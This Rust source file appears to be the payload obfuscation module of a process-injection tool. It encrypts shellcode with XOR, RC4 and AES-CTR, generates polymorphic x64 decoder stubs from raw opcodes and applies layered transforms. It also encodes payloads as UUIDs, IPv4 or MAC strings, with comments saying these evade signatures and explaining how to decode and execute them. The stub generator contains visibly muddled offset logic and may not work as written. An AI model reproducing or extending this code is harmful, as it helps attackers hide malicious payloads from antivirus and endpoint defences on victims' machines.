//! Payload Obfuscation Engine
//! XOR, AES-256, RC4, polymorphic encoding, and shellcode transformation
//! All encryption is done in-process for pre-injection obfuscation

use crate::error::MemoricError;
use serde_json::Value;

/// XOR encrypt/decrypt payload with key
pub fn xor_encrypt(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;
    let key = parse_key(args)?;

    let encrypted: Vec<u8> = payload
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "xor",
        "encrypted": encrypted,
        "encrypted_hex": hex_string(&encrypted),
        "key": key,
        "key_hex": hex_string(&key),
        "original_size": payload.len(),
        "message": format!("XOR encrypted {} bytes with {}-byte key", payload.len(), key.len())
    }))
}

/// RC4 encrypt/decrypt (streaming cipher, same operation for encrypt/decrypt)
pub fn rc4_encrypt(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;
    let key = parse_key(args)?;

    // RC4 KSA (Key Scheduling Algorithm)
    let mut s: Vec<u8> = (0..=255u8).collect();
    let mut j: u8 = 0;
    for i in 0..256usize {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    // RC4 PRGA (Pseudo-Random Generation Algorithm)
    let mut i: u8 = 0;
    j = 0;
    let encrypted: Vec<u8> = payload
        .iter()
        .map(|&b| {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
            b ^ k
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "rc4",
        "encrypted": encrypted,
        "encrypted_hex": hex_string(&encrypted),
        "key_hex": hex_string(&key),
        "original_size": payload.len(),
        "message": format!("RC4 encrypted {} bytes", payload.len())
    }))
}

/// AES-256-CTR encrypt (simple counter mode, no external deps)
pub fn aes_ctr_encrypt(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;
    let key = parse_key_sized(args, 32)?; // 256-bit key
    let nonce = args.get("nonce").and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_u64().map(|b| b as u8))
            .collect::<Vec<u8>>()
    });

    // Generate nonce if not provided
    let nonce = nonce.unwrap_or_else(|| {
        let t = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default();
        let mut n = vec![0u8; 16];
        let ts = t.as_nanos().to_le_bytes();
        n[..16.min(ts.len())].copy_from_slice(&ts[..16.min(ts.len())]);
        n
    });

    // AES-256-CTR using Windows BCrypt via shared crypto module
    let encrypted = crate::crypto::aes::aes256_ctr_encrypt(&payload, &key, &nonce);

    Ok(serde_json::json!({
        "success": true,
        "technique": "aes256_ctr",
        "encrypted": encrypted,
        "encrypted_hex": hex_string(&encrypted),
        "key_hex": hex_string(&key),
        "nonce": nonce,
        "nonce_hex": hex_string(&nonce),
        "original_size": payload.len(),
        "message": format!("AES-256-CTR encrypted {} bytes", payload.len())
    }))
}

/// Polymorphic encoder — generates unique decoder stub + encoded payload each time
pub fn polymorphic_encode(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;

    // Generate random XOR key (8-32 bytes)
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;

    let key_len = ((xorshift64(&mut seed) % 25) + 8) as usize;
    let key: Vec<u8> = (0..key_len)
        .map(|_| (xorshift64(&mut seed) & 0xFF) as u8)
        .collect();

    // Encode payload
    let encoded: Vec<u8> = payload
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();

    // Generate polymorphic x64 decoder stub
    let stub = generate_decoder_stub(&key, encoded.len(), &mut seed);

    // Combine: stub + encoded_payload
    let mut final_payload = stub.clone();
    final_payload.extend_from_slice(&encoded);

    Ok(serde_json::json!({
        "success": true,
        "technique": "polymorphic",
        "payload": final_payload,
        "payload_hex": hex_string(&final_payload),
        "stub_size": stub.len(),
        "encoded_size": encoded.len(),
        "total_size": final_payload.len(),
        "key_length": key_len,
        "original_size": payload.len(),
        "message": format!("Polymorphic encoded: {}B stub + {}B payload = {}B total", stub.len(), encoded.len(), final_payload.len())
    }))
}

/// Generate x64 decoder stub with randomized instruction sequences
fn generate_decoder_stub(key: &[u8], payload_len: usize, seed: &mut u64) -> Vec<u8> {
    let mut stub = Vec::new();

    // Randomized NOP sled prefix
    let nop_count = (xorshift64(seed) % 5) as usize;
    for _ in 0..nop_count {
        match xorshift64(seed) % 4 {
            0 => stub.push(0x90),                                   // nop
            1 => stub.extend_from_slice(&[0x66, 0x90]),             // 2-byte nop
            2 => stub.extend_from_slice(&[0x48, 0x87, 0xC0]),       // xchg rax,rax
            _ => stub.extend_from_slice(&[0x48, 0x8D, 0x24, 0x24]), // lea rsp,[rsp]
        }
    }

    // call next_instruction / pop rbx — get current RIP
    stub.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    stub.push(0x5B); // pop rbx (rbx = address of this instruction)

    // Calculate offset to encoded payload (after entire stub)
    // We'll fixup the stub size at the end
    let fixup_offset = stub.len();

    // lea rsi, [rbx + stub_remaining_size]  — will be patched
    stub.extend_from_slice(&[0x48, 0x8D, 0x73]); // lea rsi, [rbx + imm8]
    stub.push(0x00); // placeholder for offset

    // mov rcx, payload_len
    if payload_len <= 0xFF {
        // push imm8; pop rcx (polymorphic variant)
        if xorshift64(seed) % 2 == 0 {
            stub.extend_from_slice(&[0x6A, payload_len as u8, 0x59]); // push imm8; pop rcx
        } else {
            stub.extend_from_slice(&[0x48, 0xC7, 0xC1]); // mov rcx, imm32
            stub.extend_from_slice(&(payload_len as u32).to_le_bytes());
        }
    } else {
        stub.extend_from_slice(&[0x48, 0xC7, 0xC1]); // mov rcx, imm32
        stub.extend_from_slice(&(payload_len as u32).to_le_bytes());
    }

    // Embed XOR key into stub
    let key_offset = stub.len();
    // lea rdx, [rbx + key_embed_offset]
    stub.extend_from_slice(&[0x48, 0x8D, 0x53]); // lea rdx, [rbx + imm8]
    stub.push(0x00); // placeholder
    let key_lea_fixup = stub.len() - 1;

    // xor r8, r8 (key index)
    stub.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8, r8

    // mov r9, key_len
    stub.extend_from_slice(&[0x49, 0xC7, 0xC1]); // mov r9, imm32
    stub.extend_from_slice(&(key.len() as u32).to_le_bytes());

    // Decode loop
    let loop_start = stub.len();

    // test rcx, rcx; jz done
    stub.extend_from_slice(&[0x48, 0x85, 0xC9]); // test rcx, rcx
    stub.extend_from_slice(&[0x74]); // jz
    stub.push(0x00); // placeholder for jump offset
    let jz_fixup = stub.len() - 1;

    // mov al, [rsi]
    stub.extend_from_slice(&[0x8A, 0x06]);
    // mov ah, [rdx + r8]
    stub.extend_from_slice(&[0x42, 0x8A, 0x24, 0x02]); // mov ah, [rdx + r8]
                                                       // Actually: use movzx + indexing
                                                       // Let's use simpler approach:
                                                       // Overwrite the complex part - just XOR byte by byte
    let stub_len_before_loop_body = stub.len();
    // Remove the mov ah line
    stub.truncate(stub_len_before_loop_body - 4);

    // xor al, [rdx + r8*1]
    stub.extend_from_slice(&[0x42, 0x32, 0x04, 0x02]); // xor al, [rdx + r8]

    // mov [rsi], al
    stub.extend_from_slice(&[0x88, 0x06]);

    // inc rsi
    stub.extend_from_slice(&[0x48, 0xFF, 0xC6]);

    // inc r8
    stub.extend_from_slice(&[0x49, 0xFF, 0xC0]);

    // cmp r8, r9; cmovge r8d, zero -> wrap key index
    // Simpler: compare and reset
    stub.extend_from_slice(&[0x4D, 0x39, 0xC8]); // cmp r8, r9
    stub.extend_from_slice(&[0x75, 0x03]); // jne skip_reset
    stub.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8, r8

    // dec rcx
    stub.extend_from_slice(&[0x48, 0xFF, 0xC9]);

    // jmp loop_start
    let loop_end = stub.len();
    let jmp_back = loop_start as i8 - (loop_end as i8 + 2);
    stub.extend_from_slice(&[0xEB, jmp_back as u8]);

    // done: fixup jz target
    let done_offset = stub.len();
    stub[jz_fixup] = (done_offset - jz_fixup - 1) as u8;

    // lea rax, [payload_start] and jmp to decoded payload
    // The decoded payload is right after the key
    // For now, just compute where payload starts and jmp there
    // Actually payload is at stub end + 0, but we need to embed key first

    // Embed key into stub
    let key_embed_start = stub.len();
    stub.extend_from_slice(key);

    // Fixup key LEA offset
    let key_rel = key_embed_start - (key_lea_fixup + 1) - (fixup_offset - 6);
    // Actually the LEA is relative to RBX (which points to pop rbx instruction)
    // So offset = key_embed_start - fixup_offset + specific_delta
    // Let's use a different approach: just store the key offset relative to rbx
    let rbx_points_to = fixup_offset - 1; // where pop rbx is
    stub[key_lea_fixup] = (key_embed_start - rbx_points_to) as u8;

    // After key: jmp to payload (which follows immediately)
    // lea rax, [rip + 0] ; but payload is right after stub
    // Simply jump forward over key to the encoded payload location
    // Actually payload is appended AFTER the full stub, so jmp to rsi (which now points past it)
    // At this point, rsi points to encoded data start (was incremented through decode loop)
    // We need to re-point. Let's compute payload start relative to rbx.

    // Calculate total stub size including key
    let payload_data_start = stub.len(); // where caller will append encoded data

    // Fixup RSI LEA offset (lea rsi, [rbx + offset_to_payload])
    stub[fixup_offset] = (payload_data_start - rbx_points_to) as u8;

    // After decode loop: jmp to decoded payload (at the address RSI started at)
    // lea rax, [rbx + payload_offset] ; jmp rax
    stub.extend_from_slice(&[0x48, 0x8D, 0x43]); // lea rax, [rbx + imm8]
    stub.push((payload_data_start - rbx_points_to) as u8);
    stub.extend_from_slice(&[0xFF, 0xE0]); // jmp rax

    stub
}

/// String obfuscation — encrypt strings used in payloads
pub fn obfuscate_strings(args: &Value) -> Result<Value, MemoricError> {
    let strings = args
        .get("strings")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing strings array".to_string()))?;

    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;

    let mut obfuscated = Vec::new();

    for s in strings {
        if let Some(text) = s.as_str() {
            let key = (xorshift64(&mut seed) & 0xFF) as u8;
            let bytes = text.as_bytes();
            let encrypted: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();

            obfuscated.push(serde_json::json!({
                "original": text,
                "encrypted": encrypted,
                "encrypted_hex": hex_string(&encrypted),
                "key": key,
                "length": bytes.len(),
                "decrypt_code": format!("for b in &mut buf {{ *b ^= 0x{:02X}; }}", key)
            }));
        }
    }

    Ok(serde_json::json!({
        "success": true,
        "technique": "string_obfuscation",
        "strings": obfuscated,
        "count": obfuscated.len()
    }))
}

/// Shellcode transformer — applies multiple obfuscation layers
pub fn transform_shellcode(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;
    let transforms_arg = args.get("transforms").and_then(|v| v.as_array());

    // Default transform chain: shuffle_nops -> xor -> rc4
    let default_transforms = vec!["shuffle_nops", "xor", "reverse"];
    let transforms: Vec<&str> = transforms_arg
        .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or(default_transforms);

    let mut data = payload.clone();
    let mut applied = Vec::new();

    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;

    for transform in &transforms {
        match *transform {
            "xor" => {
                let key = (xorshift64(&mut seed) & 0xFF) as u8;
                data = data.iter().map(|b| b ^ key).collect();
                applied.push(serde_json::json!({"transform": "xor", "key": key}));
            }
            "reverse" => {
                data.reverse();
                applied.push(serde_json::json!({"transform": "reverse"}));
            }
            "shuffle_nops" => {
                // Insert random NOPs between instructions (basic heuristic: every N bytes)
                let interval = ((xorshift64(&mut seed) % 8) + 4) as usize;
                let mut shuffled = Vec::with_capacity(data.len() * 2);
                for (i, &b) in data.iter().enumerate() {
                    if i > 0 && i % interval == 0 {
                        let nop = match xorshift64(&mut seed) % 3 {
                            0 => vec![0x90],
                            1 => vec![0x66, 0x90],
                            _ => vec![0x0F, 0x1F, 0x00],
                        };
                        shuffled.extend_from_slice(&nop);
                    }
                    shuffled.push(b);
                }
                data = shuffled;
                applied
                    .push(serde_json::json!({"transform": "shuffle_nops", "interval": interval}));
            }
            "add" => {
                let key = (xorshift64(&mut seed) & 0xFF) as u8;
                data = data.iter().map(|b| b.wrapping_add(key)).collect();
                applied.push(serde_json::json!({"transform": "add", "key": key}));
            }
            "rot" => {
                let bits = ((xorshift64(&mut seed) % 7) + 1) as u32;
                data = data.iter().map(|b| b.rotate_left(bits)).collect();
                applied.push(serde_json::json!({"transform": "rot", "bits": bits}));
            }
            "swap_pairs" => {
                for i in (0..data.len() - 1).step_by(2) {
                    data.swap(i, i + 1);
                }
                applied.push(serde_json::json!({"transform": "swap_pairs"}));
            }
            _ => {
                applied.push(
                    serde_json::json!({"transform": transform, "status": "unknown, skipped"}),
                );
            }
        }
    }

    Ok(serde_json::json!({
        "success": true,
        "technique": "shellcode_transform",
        "transformed": data,
        "transformed_hex": hex_string(&data),
        "original_size": payload.len(),
        "transformed_size": data.len(),
        "transforms_applied": applied,
        "message": format!("Applied {} transforms: {} -> {} bytes", applied.len(), payload.len(), data.len())
    }))
}

/// UUID shellcode encoding — encode shellcode as array of UUIDs (evades many signatures)
pub fn uuid_encode(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;

    // Pad to multiple of 16
    let mut padded = payload.clone();
    while padded.len() % 16 != 0 {
        padded.push(0x90); // NOP padding
    }

    let mut uuids = Vec::new();
    for chunk in padded.chunks(16) {
        let uuid = format!(
            "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
            chunk[3], chunk[2], chunk[1], chunk[0],
            chunk[5], chunk[4],
            chunk[7], chunk[6],
            chunk[8], chunk[9],
            chunk[10], chunk[11], chunk[12], chunk[13], chunk[14], chunk[15]
        );
        uuids.push(uuid);
    }

    Ok(serde_json::json!({
        "success": true,
        "technique": "uuid_encode",
        "uuids": uuids,
        "uuid_count": uuids.len(),
        "original_size": payload.len(),
        "padded_size": padded.len(),
        "decode_hint": "Use UuidFromStringA to decode each UUID back to 16 bytes, concatenate, and execute",
        "message": format!("Encoded {} bytes as {} UUIDs", payload.len(), uuids.len())
    }))
}

/// IPv4/IPv6 shellcode encoding — encode shellcode as IP addresses
pub fn ipv4_encode(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;

    // Pad to multiple of 4
    let mut padded = payload.clone();
    while padded.len() % 4 != 0 {
        padded.push(0x90);
    }

    let ips: Vec<String> = padded
        .chunks(4)
        .map(|chunk| format!("{}.{}.{}.{}", chunk[0], chunk[1], chunk[2], chunk[3]))
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "ipv4_encode",
        "ips": ips,
        "ip_count": ips.len(),
        "original_size": payload.len(),
        "decode_hint": "Use RtlIpv4StringToAddressA to decode each IP back to 4 bytes",
        "message": format!("Encoded {} bytes as {} IPv4 addresses", payload.len(), ips.len())
    }))
}

/// MAC address shellcode encoding
pub fn mac_encode(args: &Value) -> Result<Value, MemoricError> {
    let payload = parse_payload(args)?;

    let mut padded = payload.clone();
    while padded.len() % 6 != 0 {
        padded.push(0x90);
    }

    let macs: Vec<String> = padded
        .chunks(6)
        .map(|chunk| {
            format!(
                "{:02X}-{:02X}-{:02X}-{:02X}-{:02X}-{:02X}",
                chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5]
            )
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "mac_encode",
        "macs": macs,
        "mac_count": macs.len(),
        "original_size": payload.len(),
        "decode_hint": "Use RtlEthernetStringToAddressA to decode each MAC back to 6 bytes",
        "message": format!("Encoded {} bytes as {} MAC addresses", payload.len(), macs.len())
    }))
}

// ── Helpers ──

fn parse_payload(args: &Value) -> Result<Vec<u8>, MemoricError> {
    // Try "payload" first, then "shellcode"
    let arr = args
        .get("payload")
        .or_else(|| args.get("shellcode"))
        .and_then(|v| v.as_array())
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing payload/shellcode array".to_string())
        })?;

    let data: Vec<u8> = arr
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if data.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty payload".to_string()));
    }
    Ok(data)
}

fn parse_key(args: &Value) -> Result<Vec<u8>, MemoricError> {
    if let Some(arr) = args.get("key").and_then(|v| v.as_array()) {
        let key: Vec<u8> = arr
            .iter()
            .filter_map(|v| v.as_u64().map(|b| b as u8))
            .collect();
        if !key.is_empty() {
            return Ok(key);
        }
    }
    // Generate random key
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let key: Vec<u8> = (0..16)
        .map(|_| (xorshift64(&mut seed) & 0xFF) as u8)
        .collect();
    Ok(key)
}

fn parse_key_sized(args: &Value, size: usize) -> Result<Vec<u8>, MemoricError> {
    let key = parse_key(args)?;
    if key.len() >= size {
        return Ok(key[..size].to_vec());
    }
    // Extend key by repeating
    let mut extended = key.clone();
    while extended.len() < size {
        extended.push(extended[extended.len() % key.len()] ^ (extended.len() as u8));
    }
    Ok(extended[..size].to_vec())
}

fn hex_string(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02X}", b)).collect()
}

fn xorshift64(state: &mut u64) -> u64 {
    *state ^= *state << 13;
    *state ^= *state >> 7;
    *state ^= *state << 17;
    *state
}
